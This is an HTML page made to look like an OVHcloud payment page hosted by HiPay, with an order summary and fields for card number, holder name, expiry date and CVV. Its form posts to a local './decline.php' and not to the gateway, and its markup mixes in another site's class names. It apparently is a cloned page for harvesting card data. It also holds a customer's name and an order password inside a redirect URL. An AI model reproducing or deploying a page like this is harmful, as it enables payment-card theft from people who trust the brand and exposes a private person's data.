<html class=" js inlinesvg js inlinesvg js inlinesvg js inlinesvg"><head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://secure-gateway.hipay-tpp.com/images/favicon.png">
    
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">      <title>OVHcloud World payment page</title>                  
                            <link href="https://secure-gateway.hipay-tpp.com/lib/select2/dist/css/select2.min.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/css/script/select-ideal-bank.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/min/g=boostratp_3.1.1-css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/min/g=basic-js-css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://secure-gateway.hipay-tpp.com/css/script/autodetection-template.css?104" media="screen" rel="stylesheet" type="text/css">
<link href="https://www.ovh.com/fr/themes/payment/hipay/ovh_fr.css?104" media="screen" rel="stylesheet" type="text/css">                                                
    




    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>

    <![endif]-->
</head>
<body class="script-body">
<div class="container">
    <div class="row">
        <div class="col-md-12 script-border">
            
<!-- header -->
<!-- class="hipay-logo" -->
<div class="payment-security-sprite-hipay"></div>
<!-- / header -->

                            <!-- order summary -->
<div class="row script-order-header">
    <div class="col-md-6">
        <span class="client-logo"></span>
    </div>
    <div class="col-md-6 condensed">
        <table id="orderSummaryTab" class="table table-condensed order-summary">
            <colgroup>
                <col width="30%">
                <col>
            </colgroup>
            <tbody>
                            <tr id="orderSummaryMerchantTR">
                    <td>Merchant</td>
                    <td class="order-summary-merchant-name">OVHcloud World</td>
                </tr>
                        <tr id="orderSummaryReferenceTR">
                <td>Order #</td>
                <td class="order-summary-amount">12671876-THIP1932148C</td>
            </tr>
            <tr id="orderSummaryAmountTR">
                <td>Amount</td>
                <td class="order-summary-amount">
                     USD 300.00                </td>
            </tr>
                                                                </tbody>
        </table>
    </div>
</div>
<!-- / order summary -->
                        <!-- loading -->
<div id="loading" class="loading hidden">
    <h3>Payment in progress</h3>
    <div class="progress progress-striped active">
        <div class="progress-bar" style="width: 100%;"></div>
    </div>
</div>
<!-- loading -->
    <!-- payment form -->
    <form action="./decline.php">

        <!-- device fingerprint -->
        <input type="hidden" name="device_fingerprint" id="ioBB">

        <!-- product selector -->
        <div id="payment-product-switcher-container">
            <div class="control-group"><div class="controls">
<label class="inline radio selected"><input type="radio" name="paymentproductswitcher" id="payment-product-switcher-mastercard" value="mastercard" checked="checked" class=""><i class="payment-product-sprite-mastercard"></i></label>
<label class="inline radio><input type="radio" name="paymentproductswitcher" id="payment-product-switcher-visa" value="visa" class=""><i class="payment-product-sprite-visa"></i></label></div></div>        </div>

        <div class="col-xs-12">
                    </div>

        <div id="payment-product-description"></div>

        <!-- products subforms -->
                            
            <div id="paymentMeanForm" class="form-horizontal">
        
<input type="hidden" name="paymentproduct" value="mastercard" max="32" data-tokenizable="true" id="paymentproduct">    
<input type="hidden" name="token" value="" max="32" id="token">    
<input type="hidden" name="browserInfo" value="{&quot;java_enabled&quot;:false,&quot;javascript_enabled&quot;:true,&quot;language&quot;:&quot;lt&quot;,&quot;color_depth&quot;:24,&quot;screen_height&quot;:1080,&quot;screen_width&quot;:1920,&quot;timezone&quot;:&quot;-120&quot;,&quot;http_user_agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;,&quot;ipaddr&quot;:&quot;&quot;,&quot;http_accept&quot;:&quot;&quot;}" id="browserInfo">
    <div class="form-group hidden">
        <div class="col-xs-12" id="paymentMeanLabel">
            <p class="alert-info">Information linked to your American Express account.</p>
        </div>
    </div>

    <div class="form-group" id="cardNumberGroup">
        <label for="cardNumber" class="col-sm-4 col-xs-12">card number</label>
        <div class="col-sm-8 col-xs-12 input-control">
            <input placeholder=" " type="tel" name="cardnumber" autocomplete="cc-number" spellcheck="false" data-lpignore="true" class="StyledInput__StyledMaskedInput-sc-1196yu6-0 kkNNPw invalid" value="">
        </div>
    </div>

    <input type="hidden" name="firstname" id="firstname" value="Vytenis">
    <input type="hidden" name="lastname" id="lastname" value="Kalačiovas">

    <div class="form-group" id="cardHolderGroup">
        <label for="cardHolder" class="col-sm-4 col-xs-12">card holder</label>
        <div class="col-sm-8 col-xs-12 input-control">
            <input placeholder="Firstname Lastname" type="text" name="ccname" autocomplete="cc-name" spellcheck="false" data-lpignore="true" class="StyledInput__StyledMaskedInput-sc-1196yu6-0 kkNNPw valid" value="VYTENIS KALACIOVAS">
        </div>
    </div>

    <div class="form-group  split-screen" id="expirationDateGroup">
        <label for="cardExpiryMonth" class="col-sm-4 col-xs-12">expiry date</label>
        <div class="col-sm-8 col-xs-12 input-control">
            <input placeholder="05 / 24" type="tel" name="cc-exp" autocomplete="off" spellcheck="false" data-lpignore="true" class="StyledInput__StyledMaskedInput-sc-1196yu6-0 kkNNPw invalid" value="">
        </div>
    </div>

    <div class="form-group split-screen" id="cardSecurityCodeGroup">
        <label for="cardSecurityCode" class="col-sm-4 col-xs-12">cvv                        <a id="cardSecurityCodeInfo" title="" rel="popover" data-original-title="card fields <a class='close'>×</a>">i</a>
        </label>

        <div class="col-sm-8 col-xs-12 input-control">
            <input type="tel" name="cvc" autocomplete="cc-csc" spellcheck="false" data-lpignore="true" class="StyledInput__StyledMaskedInput-sc-1196yu6-0 kkNNPw invalid" value="" placeholder="123">
        </div>
    </div>

    <div id="cardSecurityCodeInfoContent" class="popover">
        <div id="amexCVVhelp">
            <p>The American Express security code is a 4-digit number printed on the front of your card.</p>
            <p>
                <img src="https://secure-gateway.hipay-tpp.com/images/cvv_4digit.png">
            </p>
        </div>
        <div id="basicCVVhelp">
            <p>For safety reason, your Card Security Code (CSC) is required. This is the 3-digit number on the back of VISA®, MASTERCARD® or MAESTRO® cards.</p>
            <p>
                <img src="https://secure-gateway.hipay-tpp.com/images/cvv_3digit.png">
            </p>
        </div>
    </div>

    </div>
            
        <h5 class="text-danger" id="tokenIssueMsg" style="display: none;">The payment could not be processed. Your card has not been charged.</h5>
        <h5 class="text-danger" id="paymentProductIssueMsg" style="display: none;">This payment product is not available</h5>
        <h5 class="text-danger" id="proxyIssueMsg" style="display: none;">If you connect to the Internet through a corporate network, a firewall may be preventing you from accessing the page. Contact your network administrator for advice.</h5>
        <h5 class="text-danger" id="debitCardRestrictionMsg" style="display: none;">According to belgian regulations, only Debit Cards can be used to process this payment.</h5>
                <!-- submit button -->
        <div class="form-actions">
            <button type="submit" id="submit-button" name="submit-button" class="btn btn-primary submit-button">Pay</button>
        </div>

    </form>
    <!-- / payment form -->

    <script type="text/javascript">
        window.setTimeout(function(){parent.location.href="https://us.ovh.com/us/cgi-bin/order/paymentResult.cgi?order=12671876&orderPassword=oLF8FGEbIG&paymentType=CREDIT_CARD&result=cancel&paymentMethodId=730187&transactionId=1932148";}, 3598000);
    </script>
            <span data=""></span>
            <!-- footer -->
<div class="row script-footer">
    <div class="control-group">
        <div class="controls">
            <!-- Begin DigiCert site seal HTML and JavaScript -->
            <div id="DigiCertClickID_VD5P8Fm1_0" data-language="en" class="digicert-seal "><div id="DigiCertClickID_VD5P8Fm1Seal" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default;"><img src="//seal.digicert.com/seals/cascade/?tag=VD5P8Fm1&amp;referer=secure-gateway.hipay-tpp.com&amp;format=png&amp;lang=en&amp;seal_number=7&amp;seal_size=m&amp;an=min" alt="DigiCert Seal" tabindex="0" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer;"></div><span style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default; color: black;">
                <span><a href="https://www.digicert.com/buy-ssl-certificates.htm" style="text-decoration: none; text-align: center; display: inline; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer; color: black;">Buy SSL Certificates</a></span>
            </span></div>
            <script type="text/javascript">
                var __dcid = __dcid || [];__dcid.push(["DigiCertClickID_VD5P8Fm1", "7", "m", "black", "VD5P8Fm1"]);(function(){var cid=document.createElement("script");cid.async=true;cid.src="//seal.digicert.com/seals/cascade/seal.min.js";var s = document.getElementsByTagName("script");var ls = s[(s.length - 1)];ls.parentNode.insertBefore(cid, ls.nextSibling);}());
            </script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script>
            <!-- End DigiCert site seal HTML and JavaScript -->
                        <div class="payment-security-sprite-pci"></div>
        </div>
    </div>
</div>
<!-- / footer -->
        </div>
    </div>
</div>






<iframe src="https://libs.hipay.com/hostedfields/index.html#type=card&amp;element=controller&amp;instanceId=906059&amp;referrer=https://secure-gateway.hipay-tpp.com" frameborder="0" allowtransparency="true" scrolling="no" width="0" height="0" name="hipay-controller-906059" title="hipay-controller-906059" id="hipay-controller-906059" data-hipay-id="hostedfield-iframe"></iframe></body></html>